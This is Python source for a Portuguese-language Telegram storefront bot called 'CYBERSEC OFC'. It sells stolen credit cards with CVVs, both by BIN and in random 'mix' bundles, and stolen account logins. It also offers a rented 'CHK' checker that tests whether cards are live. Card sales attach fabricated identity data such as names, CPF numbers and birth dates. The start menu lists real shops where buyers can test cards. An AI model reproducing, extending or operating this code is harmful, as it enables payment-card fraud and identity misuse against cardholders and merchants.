# PIX rate limiting functions (mantido apenas por compatibilidade, não será mais usado)
def can_generate_pix(user_id: int) -> tuple[bool, str]:
    """Check if user can generate a new PIX payment"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    # Check if user is blocked
    cursor.execute('SELECT blocked_until FROM pix_attempts WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    if result and result[0]:
        blocked_until = datetime.fromisoformat(result[0])
        if datetime.now() < blocked_until:
            remaining = blocked_until - datetime.now()
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            conn.close()
            return False, f"❌ Você está bloqueado de gerar PIX por {hours}h{minutes}m devido a 3 tentativas não pagas."
    
    # Check cooldown
    cursor.execute('SELECT last_attempt FROM pix_attempts WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    if result and result[0]:
        last_attempt = datetime.fromisoformat(result[0])
        time_since_last = datetime.now() - last_attempt
        if time_since_last.total_seconds() < PIX_COOLDOWN:
            remaining = PIX_COOLDOWN - time_since_last.total_seconds()
            minutes = int(remaining // 60)
            seconds = int(remaining % 60)
            conn.close()
            return False, f"⏳ Aguarde {minutes}:{seconds:02d} minutos antes de gerar outro PIX."
    
    conn.close()
    return True, ""

def update_pix_attempt(user_id: int, payment_id: str):
    """Update PIX attempt record"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    # Update attempts count
    cursor.execute('''
        INSERT OR REPLACE INTO pix_attempts (user_id, attempts, last_attempt)
        VALUES (?, COALESCE((SELECT attempts FROM pix_attempts WHERE user_id = ?), 0) + 1, ?)
    ''', (user_id, user_id, datetime.now().isoformat()))
    
    # Store payment
    cursor.execute('''
        INSERT INTO pix_payments (user_id, payment_id, amount, status)
        VALUES (?, ?, ?, 'pending')
    ''', (user_id, payment_id, 0))
    
    conn.commit()
    conn.close()

def check_unpaid_attempts(user_id: int):
    """Check if user has 3 unpaid attempts"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT COUNT(*) FROM pix_payments 
        WHERE user_id = ? AND status = 'pending' 
        AND created_at > datetime('now', '-1 day')
    ''', (user_id,))
    
    count = cursor.fetchone()[0]
    
    if count >= PIX_BLOCK_THRESHOLD:
        blocked_until = datetime.now() + timedelta(seconds=PIX_BLOCK_DURATION)
        cursor.execute('''
            UPDATE pix_attempts 
            SET blocked_until = ?
            WHERE user_id = ?
        ''', (blocked_until.isoformat(), user_id))
        conn.commit()
    
    conn.close()
    return count

async def check_pending_payments(context: ContextTypes.DEFAULT_TYPE):
    """Background task to check pending PIX payments"""
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT user_id, payment_id, amount 
        FROM pix_payments 
        WHERE status = 'pending'
    ''')
    
    pending_payments = cursor.fetchall()
    
    for user_id, payment_id, amount in pending_payments:
        status = check_payment_status(payment_id)
        
        if status == "approved":
            # Update payment status
            cursor.execute('''
                UPDATE pix_payments 
                SET status = 'approved', confirmed_at = ?, updated_at = ?
                WHERE payment_id = ?
            ''', (datetime.now().isoformat(), datetime.now().isoformat(), payment_id))
            
            # Add balance to user
            update_balance(user_id, amount)
            
            # Reset attempts
            cursor.execute('''
                UPDATE pix_attempts 
                SET attempts = 0, blocked_until = NULL 
                WHERE user_id = ?
            ''', (user_id,))
            
            # Notify user
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"✅ **PAGAMENTO CONFIRMADO!**\n\n"
                         f"💰 **Valor:** R$ {amount:.2f}\n"
                         f"💳 **Saldo adicionado:** R$ {amount:.2f}\n"
                         f"🎉 **Agora você pode comprar seus cartões!**",
                    parse_mode='Markdown'
                )
            except:
                pass
    
    conn.commit()
    conn.close()

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if not has_chk_access(user_id):
        await update.message.reply_text(
            "Para usar o CHK você precisa alugar.\nChame @cybersecofc")
        return

    if not context.args:
        await update.message.reply_text(
            "Use: /chk [cartão]\nExemplo: /chk 4833120197889752|02|2030|000")
        return

    card_data = context.args[0].split('|')
    if len(card_data) != 4:
        await update.message.reply_text("Formato inválido do cartão.")
        return

    cc, mm, yy, cvv = card_data

    if not (len(cc) >= 15 and len(cc) <= 16 and cc.isdigit() and 
            mm.isdigit() and len(mm) == 2 and int(mm) >= 1 and int(mm) <= 12 and
            yy.isdigit() and len(yy) == 4 and int(yy) >= 2024 and
            cvv.isdigit() and (len(cvv) == 3 or len(cvv) == 4)):
        await update.message.reply_text("❌ Dados do cartão inválidos.")
        return

    processing_msg = await update.message.reply_text("🔄 Verificando cartão...")

    try:
        bin_code = cc[:6]
        bank_name = get_bank_name(bin_code)
        card_type = get_card_type(cc)
        
        result = check_card_live(cc, mm, yy, cvv)
        
        if result["status"] == "approved":
            status_emoji = "✅"
            status_text = "APROVADO"
            color = "🟢"
        elif result["status"] == "pending":
            status_emoji = "⏳"
            status_text = "PENDENTE"
            color = "🟡"
        elif result["status"] == "declined":
            status_emoji = "❌"
            status_text = "REPROVADO"
            color = "🔴"
        else:
            status_emoji = "⚠️"
            status_text = "ERRO"
            color = "🟠"

        result_text = f"{color} **CHK RESULT** {color}\n\n"
        result_text += f"**Card:** {cc[:6]}••••••••{cc[-4:]}\n"
        result_text += f"**Exp:** {mm}/{yy}\n"
        result_text += f"**CVV:** {cvv}\n"
        result_text += f"**Bank:** {bank_name}\n"
        result_text += f"**Type:** {card_type}\n"
        result_text += f"**BIN:** {bin_code}\n\n"
        result_text += f"**Status:** {status_emoji} {status_text}\n"
        result_text += f"**Message:** {result['message']}\n\n"
        result_text += f"**User:** {update.effective_user.first_name} ({user_id})\n"
        result_text += f"**Time:** {datetime.now().strftime('%H:%M:%S')}"

        await processing_msg.edit_text(result_text, parse_mode='Markdown')

    except Exception as e:
        await processing_msg.edit_text(
            f"❌ **CHK ERROR**\n\n"
            f"**Card:** {cc[:6]}••••••••{cc[-4:]}\n"
            f"**Error:** {str(e)}\n\n"
            f"**User:** {update.effective_user.first_name} ({user_id})",
            parse_mode='Markdown'
        )

async def temp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the /temp command to rent CHK access."""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("Apenas administradores podem usar este comando.")
        return

    if len(context.args) < 3:
        await update.message.reply_text(
            "Use: /temp [user_id] [duration] [hours|days]\n"
            "Exemplo: /temp 123456 3 hours\n"
            "Exemplo: /temp 123456 2 days"
        )
        return

    try:
        user_id = int(context.args[0])
        duration = int(context.args[1])
        unit = context.args[2].lower()

        if unit not in ['hours', 'days', 'horas', 'dias']:
            await update.message.reply_text("Unidade de tempo inválida. Use 'hours', 'days', 'horas' ou 'dias'.")
            return

        user_data = get_user(user_id)
        if not user_data:
            await update.message.reply_text(f"❌ Usuário {user_id} não encontrado.")
            return

        if unit in ['hours', 'horas']:
            grant_chk_access(user_id, hours=duration)
            await update.message.reply_text(
                f"✅ CHK acesso concedido!\n\n"
                f"**Usuário:** {user_data['first_name']} ({user_id})\n"
                f"**Duração:** {duration} horas\n"
                f"**Expira em:** {(datetime.now() + timedelta(hours=duration)).strftime('%d/%m/%Y %H:%M')}",
                parse_mode='Markdown'
            )
            
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"🎉 **CHK ACCESS LIBERADO!**\n\n"
                    f"Você agora tem acesso ao CHK por {duration} horas!\n"
                    f"Use: `/chk cartão|mês|ano|cvv`\n\n"
                    f"Expira em: {(datetime.now() + timedelta(hours=duration)).strftime('%d/%m/%Y %H:%M')}",
                    parse_mode='Markdown'
                )
            except:
                pass
                
        elif unit in ['days', 'dias']:
            grant_chk_access(user_id, days=duration)
            await update.message.reply_text(
                f"✅ CHK acesso concedido!\n\n"
                f"**Usuário:** {user_data['first_name']} ({user_id})\n"
                f"**Duração:** {duration} dias\n"
                f"**Expira em:** {(datetime.now() + timedelta(days=duration)).strftime('%d/%m/%Y %H:%M')}",
                parse_mode='Markdown'
            )
            
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"🎉 **CHK ACCESS LIBERADO!**\n\n"
                    f"Você agora tem acesso ao CHK por {duration} dias!\n"
                    f"Use: `/chk cartão|mês|ano|cvv`\n\n"
                    f"Expira em: {(datetime.now() + timedelta(days=duration)).strftime('%d/%m/%Y %H:%M')}",
                    parse_mode='Markdown'
                )
            except:
                pass

    except ValueError:
        await update.message.reply_text("❌ ID do usuário e duração devem ser números inteiros.")
    except Exception as e:
        await update.message.reply_text(f"❌ Ocorreu um erro: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # Verificar se o usuário está no grupo
    try:
        in_group = await check_user_in_group(context, user.id)
    except Exception as e:
        print(f"Erro ao verificar grupo: {e}")
        in_group = False

    if not in_group and user.id != ADMIN_ID:
        keyboard = [[
            InlineKeyboardButton("🔗 Entrar no Grupo",
                                 url=f"https://t.me/chatcyberofclink")
        ]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            "❌ **ACESSO NEGADO**\n\n"
            "Para usar este bot, você precisa estar no nosso grupo oficial!\n\n"
            "👇 Clique no botão abaixo para entrar:",
            reply_markup=reply_markup,
            parse_mode='Markdown')
        return

    create_user(user.id, user.username, user.first_name)
    user_data = get_user(user.id)

    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT value FROM bot_settings WHERE key = ?',
                   ('main_photo', ))
    photo_result = cursor.fetchone()
    conn.close()

    keyboard = [[
        InlineKeyboardButton("💳 Comprar GGS", callback_data="buy_cc"),
        InlineKeyboardButton("🎯 Comprar MIX", callback_data="buy_mix")
    ],
                [
                    InlineKeyboardButton("🔐 Login", callback_data="buy_login"),
                    InlineKeyboardButton("🔍 CHK", callback_data="chk_info")
                ],
                [
                    InlineKeyboardButton("💰 Depositar", callback_data="deposit"),
                    InlineKeyboardButton("🎁 Resgatar Gift", callback_data="redeem_gift")
                ],
                [
                    InlineKeyboardButton("🤝 Afiliados", callback_data="affiliate"),
                    InlineKeyboardButton("🤖 Alugar Bot", callback_data="rent_bot")
                ],
                [
                    InlineKeyboardButton("👤 Meu Perfil", callback_data="profile")
                ]]

    if user.id == ADMIN_ID:
        keyboard.append([
            InlineKeyboardButton("⚙️ Painel Admin",
                                 callback_data="admin_panel")
        ])

    reply_markup = InlineKeyboardMarkup(keyboard)

    # Corrigindo o saldo do admin
    if user.id == ADMIN_ID:
        # Resetar o saldo do admin para 0 se estiver muito alto
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute('UPDATE users SET balance = 0 WHERE user_id = ?', (ADMIN_ID,))
        conn.commit()
        conn.close()
        user_data['balance'] = 0.0

    text = f"🔥 **CYBERSEC OFC** 🔥\n\n"
    text += f"**ID:** `{user.id}`\n"
    text += f"**Nome:** {user_data['first_name']}\n"
    text += f"**Saldo:** R$ {user_data['balance']:.2f}\n\n"
    
    # Adicionando o texto personalizado
    text += "🎯 𝔾𝔸𝔾𝔸ℕ𝕋𝕀𝔸 𝔸ℙ𝔼ℕ𝔸𝕊 𝔻𝔼 𝕃𝕀𝕍𝔼 💎\n\n"
    text += "🔄 𝕋ℝ𝕆ℂ𝔸𝕊 𝔽𝔼𝕀𝕋𝔸 ℕ𝕆 ℙ𝕍 𝔼 ℂ𝕆𝕄 ℙℝ𝕀ℕ𝕋 𝔻𝕆 𝔼ℝℝ𝕆 𝕆𝕂\n"
    text += "✅ 𝔸ℙℝ𝕆𝕍𝕆𝕌 𝕄𝔸ℕ𝔻𝔸 ℝ𝔼𝔽 𝔼 ℝ𝔼ℂ𝔼𝔹𝔸 𝕊𝔸𝕃𝔻𝕆 ℂ𝕆𝕄𝕆 𝔹𝕆ℕ𝕌𝕊\n"
    text += "🔥 𝕋𝕆𝔻𝔸𝕊 𝔾𝔾𝕊 𝔼𝕊𝕋𝔸𝕆 𝕃𝕀𝕍𝔼 ✅\n\n"
    text += "🌐 𝕊𝕀𝕋𝔼𝕊 ℙ𝔸ℝ𝔸 𝕋𝔼𝕊𝕋𝔼 𝕄𝔸ℕ𝕌𝔸𝕀𝕊\n"
    text += "• https://www.divvino.com.br\n"
    text += "• https://www.drogalider.com.br\n"
    text += "• https://loja.magiccity.com.br/\n\n"
    text += "⚠️ 𝕋𝔼𝕊𝕋𝔸 𝔼 𝕄𝔸ℕ𝔻𝔸 ℙℝ𝕀ℕ𝕋 𝕋ℝ𝕆ℂ𝔸𝕄𝕆𝕊 𝔸ℙ𝔼ℕ𝔸𝕊 𝔾𝔾𝕊 𝔻𝕀𝔼 𝕆𝕂\n"
    text += "🚫 𝕊𝔼 ℕ𝔸𝕆 𝕊𝔸𝔹𝔼 𝕌𝕊𝔸ℝ ℕ𝔸𝕆 ℂ𝕆𝕄ℙℝ𝔼 ❌\n\n"
    text += "Escolha uma opção abaixo:"

    if photo_result:
        try:
            await update.message.reply_photo(photo=photo_result[0],
                                             caption=text,
                                             reply_markup=reply_markup,
                                             parse_mode='Markdown')
        except:
            await update.message.reply_text(text,
                                            reply_markup=reply_markup,
                                            parse_mode='Markdown')
    else:
        await update.message.reply_text(text,
                                        reply_markup=reply_markup,
                                        parse_mode='Markdown')

    if context.args:
        affiliate_code = context.args[0]
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT user_id FROM affiliates WHERE affiliate_code = ?',
            (affiliate_code, ))
        result = cursor.fetchone()
        if result:
            referred_by = result[0]
            cursor.execute(
                'UPDATE affiliates SET referred_by = ? WHERE user_id = ? AND referred_by IS NULL',
                (referred_by, user.id))
            conn.commit()
            conn.close()

            await update.message.reply_text(
                "✅ Você foi indicado por um afiliado!\n"
                "Seu indicador será recompensado quando você realizar um depósito."
            )
        else:
            conn.close()

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    # Verificar se o usuário está no grupo
    try:
        in_group = await check_user_in_group(context, query.from_user.id)
    except Exception as e:
        print(f"Erro ao verificar grupo: {e}")
        in_group = False

    if not in_group and query.from_user.id != ADMIN_ID:
        keyboard = [[
            InlineKeyboardButton("🔗 Entrar no Grupo",
                                 url=f"https://t.me/chatcyberofclink")
        ]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(
            "❌ **ACESSO NEGADO**\n\n"
            "Para usar este bot, você precisa estar no nosso grupo oficial!\n\n"
            "👇 Clique no botão abaixo para entrar:",
            reply_markup=reply_markup,
            parse_mode='Markdown')
        return

    user_data = get_user(query.from_user.id)
    if user_data and user_data['is_blocked']:
        await query.edit_message_text("🚫 Você está bloqueado!")
        return

    if query.data == "buy_cc":
        await show_banks(query, context)
    elif query.data == "buy_mix":
        await show_mix_options(query, context)
    elif query.data == "buy_login":
        await show_login_categories(query, context)
    elif query.data == "deposit":
        # NOVO: Direcionar para o PV do admin para pagamento manual
        keyboard = [[
            InlineKeyboardButton("💬 Falar com @cybersecofc", url="https://t.me/cybersecofc")
        ]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        text = "💰 **DEPÓSITO MANUAL**\n\n"
        text += "Para depositar saldo:\n\n"
        text += "1️⃣ Clique no botão abaixo para falar com @cybersecofc\n"
        text += "2️⃣ Envie o comprovante do PIX\n"
        text += "3️⃣ Após confirmação, você receberá um GIFT CARD\n"
        text += "4️⃣ Use o código do gift no bot para resgatar o saldo\n\n"
        text += "⏱️ Seu saldo será adicionado em até 5 minutos!"
        
        try:
            await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
        except Exception:
            await query.message.delete()
            await context.bot.send_message(chat_id=query.from_user.id, text=text, reply_markup=reply_markup, parse_mode='Markdown')
    elif query.data == "redeem_gift":
        text = "🎁 **Resgatar Gift Card**\n\n" \
               "📝 **Digite o código do gift no chat**\n" \
               "Exemplo: se o código for ABC12345, apenas digite: `ABC12345`\n\n" \
               "✨ **É só isso! Muito mais rápido e prático!**"

        try:
            await query.edit_message_text(text, parse_mode='Markdown')
        except Exception:
            await query.message.delete()
            await context.bot.send_message(chat_id=query.from_user.id,
                                           text=text,
                                           parse_mode='Markdown')
    elif query.data == "profile":
        await show_profile(query, context)
    elif query.data == "affiliate":
        await show_affiliate(query, context)
    elif query.data == "admin_panel" and query.from_user.id == ADMIN_ID:
        await show_admin_panel(query, context)
    elif query.data.startswith("bank_"):
        bank_name = query.data[5:]
        await show_bank_bins(query, context, bank_name)
    elif query.data.startswith("bin_"):
        bin_code = query.data[4:]
        await show_bin_cards(query, context, bin_code, 0)
    elif query.data.startswith("card_"):
        parts = query.data.split("_", 2)
        bin_code = parts[1]
        page = int(parts[2])
        await show_bin_cards(query, context, bin_code, page)
    elif query.data.startswith("buy_"):
        await process_purchase(query, context)
    elif query.data.startswith("mix_"):
        quantity = int(query.data[4:])
        await process_mix_purchase(query, context, quantity)
    elif query.data.startswith("login_cat_"):
        category = query.data[10:]
        await show_logins(query, context, category)
    elif query.data.startswith("admin_prices"):
        await show_price_management(query, context)
    elif query.data.startswith("admin_users"):
        await show_user_management(query, context)
    elif query.data.startswith("admin_stats"):
        await show_admin_stats(query, context)
    elif query.data.startswith("admin_balance"):
        await show_balance_management(query, context)
    elif query.data.startswith("admin_messages"):
        await show_message_management(query, context)
    elif query.data.startswith("set_price_"):
        bin_code = query.data[10:]
        context.user_data['setting_price_for'] = bin_code
        await query.edit_message_text(
            f"💰 Digite o novo preço para BIN {bin_code}:\n\n"
            "Envie apenas o número (ex: 15.50)")
    elif query.data.startswith("add_balance"):
        context.user_data['admin_action'] = 'add_balance'
        await query.edit_message_text("💰 **Adicionar Saldo**\n\n"
                                      "Digite no formato: `ID valor`\n"
                                      "Exemplo: `123456789 50.00`")
    elif query.data.startswith("remove_balance"):
        context.user_data['admin_action'] = 'remove_balance'
        await query.edit_message_text("💸 **Remover Saldo**\n\n"
                                      "Digite no formato: `ID valor`\n"
                                      "Exemplo: `123456789 25.00`")
    elif query.data.startswith("send_group_msg"):
        context.user_data['admin_action'] = 'send_group_msg'
        await query.edit_message_text("📢 **Enviar Mensagem para o Grupo**\n\n"
                                      "Digite a mensagem que deseja enviar:")
    elif query.data == "back_to_menu":
        await start_menu(query, context)
    elif query.data == "back_to_admin":
        await show_admin_panel(query, context)
    elif query.data == "back_to_banks":
        await show_banks(query, context)
    elif query.data == "back_to_mix":
        await show_mix_options(query, context)
    elif query.data.startswith("back_to_login_categories"):
         await show_login_categories(query, context)
    elif query.data.startswith("back_to_bank_"):
        bank_name = query.data[13:]
        await show_bank_bins(query, context, bank_name)
    elif query.data == "rent_bot":
        await rent_bot(query, context)
    elif query.data == "chk_info":
        await chk_info(query, context)

async def chk_info(query, context):
    """Shows information about CHK and renting access."""
    user_id = query.from_user.id
    
    text = "✨ **Bem-vindo ao CHK CyberSecOFC** ✨\n\n"
    text += f"**Seu ID:** `{user_id}`\n\n"
    text += "Para usar o CHK, você precisa alugar o acesso.\n\n"
    text += "📱 **Como alugar:**\n"
    text += f"1. Copie seu ID: `{user_id}`\n"
    text += "2. Entre em contato com @cybersecofc\n"
    text += "3. Envie seu ID para liberação do acesso\n\n"
    text += "💰 **Planos disponíveis:**\n"
    text += "• Por horas\n"
    text += "• Por dias\n"
    text += "• Mensal\n\n"

    keyboard = [[InlineKeyboardButton("📱 Entre em contato", url="https://t.me/cybersecofc")] , [InlineKeyboardButton("🔙 Voltar", callback_data="back_to_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await query.edit_message_text(text,
                                      reply_markup=reply_markup,
                                      parse_mode='Markdown')
    except Exception:
        await query.message.delete()
        await context.bot.send_message(chat_id=query.from_user.id,
                                       text=text,
                                       reply_markup=reply_markup,
                                       parse_mode='Markdown')

async def rent_bot(query, context):
    """Shows information about renting the bot."""
    text = "✨ **Bem-vindo a Bot CyberSecOFC** ✨\n\n"
    text += "Trabalhamos com automação de bot para vendedores de:\n"
    text += "• Logins\n• CC\n• GG\n• Kit Bicos\n• Lara\n• Consultas\n• Etc...\n\n"
    text += "Para alugar é muito simples, basta entrar em contato com: @cybersecofc\n\n"
    text += "Trabalho com automação de bot desde 2020.\n\n"
    text += "Para mais detalhes, entre em contato."

    keyboard = [[InlineKeyboardButton("Entre em contato", url="https://t.me/cybersecofc")] , [InlineKeyboardButton("🔙 Voltar", callback_data="back_to_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await query.edit_message_text(text,
                                      reply_markup=reply_markup,
                                      parse_mode='Markdown')
    except Exception:
        await query.message.delete()
        await context.bot.send_message(chat_id=query.from_user.id,
                                       text=text,
                                       reply_markup=reply_markup,
                                       parse_mode='Markdown')

async def show_affiliate(query, context):
    """Show affiliate information"""
    user_id = query.from_user.id
    affiliate_data = get_affiliate(user_id)

    if not affiliate_data:
        affiliate_code = create_affiliate(user_id)
        affiliate_data = get_affiliate(user_id)

    bot_name = context.bot.username
    affiliate_link = get_affiliate_link(bot_name,
                                        affiliate_data['affiliate_code'])

    text = "🤝 **Programa de Afiliados**\n\n"
    text += "Divulgue seu link de afiliado e ganhe 50% de cada depósito que seus indicados fizerem!\n\n"
    text += f"**Seu link de afiliado:**\n`{affiliate_link}`\n\n"
    text += "Compartilhe com seus amigos e comece a ganhar!"

    keyboard = [[
        InlineKeyboardButton("🔙 Voltar", callback_data="back_to_menu")
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await query.edit_message_text(text,
                                      reply_markup=reply_markup,
                                      parse_mode='Markdown')
    except Exception:
        await query.message.delete()
        await context.bot.send_message(chat_id=query.from_user.id,
                                       text=text,
                                       reply_markup=reply_markup,
                                       parse_mode='Markdown')

async def show_login_categories(query: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show available login categories."""
    categories = get_login_categories()
    if not categories:
        text = "❌ Nenhuma conta disponível no momento!"
        try:
            await query.edit_message_text(text)
        except Exception:
            await query.message.delete()
            await context.bot.send_message(chat_id=query.from_user.id, text=text)
        return

    keyboard = []
    for cat_data in categories:
        category = cat_data['category']
        count = cat_data['count']

        keyboard.append([
            InlineKeyboardButton(f"🔐 {category} ({count} Contas)", callback_data=f"login_cat_{category}")
        ])

    keyboard.append([InlineKeyboardButton("🔙 Voltar", callback_data="back_to_menu")])
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = "🔐 **Selecione a Categoria de Login:**"
    try:
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    except Exception:
        await query.message.delete()
        await context.bot.send_message(chat_id=query.from_user.id, text=text, reply_markup=reply_markup, parse_mode='Markdown')

async def show_logins(query: Update, context: ContextTypes.DEFAULT_TYPE, category: str):
    """Show logins for selected category."""
    logins = get_logins_by_category(category)
    if not logins:
        text = f"❌ Nenhum login disponível para a categoria: {category}!"
        try:
            await query.edit_message_text(text)
        except Exception:
            await query.message.delete()
            await context.bot.send_message(chat_id=query.from_user.id, text=text)
        return

    text = f"🔐 **Logins disponíveis para {category}:**\n\n"
    for login_data in logins:
        text += f"- `{login_data['login']}`\n"

    keyboard = [[InlineKeyboardButton("🔙 Voltar", callback_data="back_to_login_categories")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    except Exception:
        await query.message.delete()
        await context.bot.send_message(chat_id=query.from_user.id, text=text, reply_markup=reply_markup, parse_mode='Markdown')

async def show_mix_options(query, context):
    """Show mix purchase options"""
    keyboard = []

    for quantity, price in MIX_PRICES.items():
        keyboard.append([
            InlineKeyboardButton(f"🎯 MIX {quantity} CCs - R$ {price:.2f}",
                                 callback_data=f"mix_{quantity}")
        ])

    keyboard.append(
        [InlineKeyboardButton("🔙 Voltar", callback_data="back_to_menu")])
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = "🎯 **COMPRAR MIX**\n\n"
    text += "💳 **Mix são cartões aleatórios de diferentes bancos e BINs**\n\n"
    text += "📦 **Opções disponíveis:**\n"
    for quantity, price in MIX_PRICES.items():
        text += f"• {quantity} cartões por R$ {price:.2f}\n"
    text += "\n🎲 **Todos os cartões são selecionados aleatoriamente!**"

    try:
        await query.edit_message_text(text,
                                      reply_markup=reply_markup,
                                      parse_mode='Markdown')
    except Exception:
        await query.message.delete()
        await context.bot.send_message(chat_id=query.from_user.id,
                                       text=text,
                                       reply_markup=reply_markup,
                                       parse_mode='Markdown')

async def process_mix_purchase(query, context, quantity: int):
    """Process mix purchase"""
    user_data = get_user(query.from_user.id)
    price = MIX_PRICES.get(quantity, 0)

    if price == 0:
        await query.edit_message_text("❌ Quantidade inválida!")
        return

    if user_data['balance'] < price:
        text = f"❌ Saldo insuficiente!\n" \
               f"Preço: R$ {price:.2f}\n" \
               f"Seu saldo: R$ {user_data['balance']:.2f}"
        await query.edit_message_text(text)
        return

    cards = get_random_cards_for_mix(quantity)

    if len(cards) < quantity:
        await query.edit_message_text(
            f"❌ Não há cartões suficientes em estoque!\n"
            f"Disponível: {len(cards)} cartões\n"
            f"Solicitado: {quantity} cartões")
        return

    update_balance(query.from_user.id, -price)

    for card in cards:
        mark_card_sold(card['number'])

    try:
        group_text = f"🎯 **COMPRA MIX REALIZADA**\n\n"
        group_text += f"**ID:** {query.from_user.id}\n"
        group_text += f"**Nome:** {query.from_user.first_name}\n"
        group_text += f"**Quantidade:** {quantity} cartões\n"
        group_text += f"**Valor:** R$ {price:.2f}"

        # Obter o chat_id do grupo pelo username
        chat = await context.bot.get_chat(GROUP_USERNAME)
        await context.bot.send_message(chat_id=chat.id,
                                       text=group_text,
                                       parse_mode='Markdown')
    except Exception as e:
        print(f"Erro ao enviar para grupo: {e}")

    await query.message.delete()

    summary_text = f"✅ **COMPRA MIX APROVADA!**\n\n"
    summary_text += f"🎯 **Quantidade:** {quantity} cartões\n"
    summary_text += f"💰 **Valor cobrado:** R$ {price:.2f}\n"
    summary_text += f"💳 **Saldo restante:** R$ {user_data['balance'] - price:.2f}\n\n"
    summary_text += f"📦 **Seus cartões chegaram!**"

    await context.bot.send_message(chat_id=query.from_user.id,
                                   text=summary_text,
                                   parse_mode='Markdown')

    for i, card in enumerate(cards, 1):
        fake_data = generate_fake_data()

        card_image = generate_3d_card(card, user_data, fake_data)

        card_caption = f"💳 **CARTÃO {i}/{quantity}**\n"
        card_caption += f"🏦 **{card['bank_name']} - {card['bin']}**"

        try:
            await context.bot.send_photo(chat_id=query.from_user.id,
                                         photo=card_image,
                                         caption=card_caption,
                                         parse_mode='Markdown')
        except Exception as e:
            print(f"Erro ao enviar cartão {i}: {e}")

        card_text = f"📋 **DADOS DO CARTÃO {i}:**\n\n"
        card_text += f"💳 **CARTÃO:**\n"
        card_text += f"**Número:** `{card['number']}`\n"
        card_text += f"**Validade:** `{card['month']}/{card['year']}`\n"
        card_text += f"**CVV:** `{card['cvv']}`\n\n"
        card_text += f"👤 **DADOS AUXILIARES:**\n"
        card_text += f"**Nome:** {fake_data['name']}\n"
        card_text += f"**CPF:** {fake_data['cpf']}\n"
        card_text += f"**Nascimento:** {fake_data['birth_date']}\n"
        card_text += f"**Email:** {fake_data['email']}"

        await context.bot.send_message(chat_id=query.from_user.id,
                                       text=card_text,
                                       parse_mode='Markdown')

        await asyncio.sleep(0.5)

async def start_menu(query, context):
    user_data = get_user(query.from_user.id)

    # Corrigir saldo do admin
    if query.from_user.id == ADMIN_ID:
        conn = sqlite3.connect('bot_database.db')
        cursor = conn.cursor()
        cursor.execute('UPDATE users SET balance = 0 WHERE user_id = ?', (ADMIN_ID,))
        conn.commit()
        conn.close()
        user_data['balance'] = 0.0

    keyboard = [[
        InlineKeyboardButton("💳 Comprar GGS", callback_data="buy_cc"),
        InlineKeyboardButton("🎯 Comprar MIX", callback_data="buy_mix")
    ],
                [
                    InlineKeyboardButton("🔐 Login", callback_data="buy_login"),
                    InlineKeyboardButton("🔍 CHK", callback_data="chk_info")
                ],
                [
                    InlineKeyboardButton("💰 Depositar", callback_data="deposit"),
                    InlineKeyboardButton("🎁 Resgatar Gift", callback_data="redeem_gift")
                ],
                [
                    InlineKeyboardButton("🤝 Afiliados", callback_data="affiliate"),
                    InlineKeyboardButton("🤖 Alugar Bot", callback_data="rent_bot")
                ],
                [
                    InlineKeyboardButton("👤 Meu Perfil", callback_data="profile")
                ]]

    if query.from_user.id == ADMIN_ID:
        keyboard.append([
            InlineKeyboardButton("⚙️ Painel Admin",
                                 callback_data="admin_panel")
        ])

    reply_markup = InlineKeyboardMarkup(keyboard)

    text = f"🔥 **CYBERSEC OFC** 🔥\n\n"
    text += f"**ID:** `{query.from_user.id}`\n"
    text += f"**Nome:** {user_data['first_name']}\n"
    text += f"**Saldo:** R$ {user_data['balance']:.2f}\n\n"
    
    # Adicionando o texto personalizado
    text += "🎯 𝔾𝔸𝔾𝔸ℕ𝕋𝕀𝔸 𝔸ℙ𝔼ℕ𝔸𝕊 𝔻𝔼 𝕃𝕀𝕍𝔼 💎\n\n"
    text += "🔄 𝕋ℝ𝕆ℂ𝔸𝕊 𝔽𝔼𝕀𝕋𝔸 ℕ𝕆 ℙ𝕍 𝔼 ℂ𝕆𝕄 ℙℝ𝕀ℕ𝕋 𝔻𝕆 𝔼ℝℝ𝕆 𝕆𝕂\n"
    text += "✅ 𝔸ℙℝ𝕆𝕍𝕆𝕌 𝕄𝔸ℕ𝔻𝔸 ℝ𝔼𝔽 𝔼 ℝ𝔼ℂ𝔼𝔹𝔸 𝕊𝔸𝕃𝔻𝕆 ℂ𝕆𝕄𝕆 𝔹𝕆ℕ𝕌𝕊\n"
